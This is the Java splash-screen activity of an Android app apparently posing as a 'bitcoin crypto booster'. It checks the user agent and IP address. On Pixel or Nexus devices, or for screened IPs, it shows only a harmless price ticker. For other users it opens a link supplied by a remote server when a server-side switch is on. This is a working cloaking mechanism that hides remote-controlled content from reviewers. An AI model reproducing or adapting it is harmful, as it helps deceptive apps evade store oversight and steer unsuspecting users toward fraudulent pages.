package bitcoin.crypto.booster.activities;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.util.List;

import bitcoin.crypto.booster.Ti;
import bitcoin.crypto.booster.ada.AdaNet;
import bitcoin.crypto.booster.mo.IP;
import bitcoin.crypto.booster.mo.TickerResponse;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SplashActivity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getS();
    }

    private void getS() {
        String ua = System.getProperty("http.agent");
        if (ua == null || ua.contains("Pixel") || ua.contains("Nexus")) loadTicker();
        else loadIp();
    }


    private void loadIp() {
        AdaNet.loadIP().enqueue(new Callback<IP>() {
            @Override
            public void onResponse(Call<IP> call, Response<IP> response) {
                if (response.isSuccessful() && response.body() != null && Ti.checkIp(SplashActivity.this, response.body().ip))
                    loadUrli();
                else
                    loadTicker();

            }

            @Override
            public void onFailure(Call<IP> call, Throwable t) {
                Log.e("APP", "failure + " + t);
                loadTicker();
            }
        });
    }

    private void loadUrli() {

        AdaNet.loadUrli().enqueue(new Callback<bitcoin.crypto.booster.mo.Urli>() {
            @Override
            public void onResponse(Call<bitcoin.crypto.booster.mo.Urli> call, Response<bitcoin.crypto.booster.mo.Urli> response) {
                if (response.isSuccessful() && response.body() != null && response.body().isOn)
                    openUrli(response.body().link);
                else
                    loadTicker();
            }

            @Override
            public void onFailure(Call<bitcoin.crypto.booster.mo.Urli> call, Throwable t) {
                loadTicker();
            }
        });
    }

    private void loadTicker() {
        AdaNet.ticker().enqueue(new Callback<TickerResponse>() {
            @Override
            public void onResponse(Call<TickerResponse> call, Response<TickerResponse> response) {
                if (response.isSuccessful() && response.body() != null && response.body().data != null) {
                    Ti.save(SplashActivity.this, response.body().data);
                }
                openMain();

            }

            @Override
            public void onFailure(Call<TickerResponse> call, Throwable t) {
                openMain();
            }
        });
    }


    private void openUrli(String week) {
        Intent newActivity = new Intent(this, UrliActivity.class);
        newActivity.putExtra("week", week);
        startActivity(newActivity);
        this.finish();
        overridePendingTransition(0, 0);
    }

    private void openMain() {
        startActivity(new Intent(this, MainActivity.class));
        this.finish();
    }
}
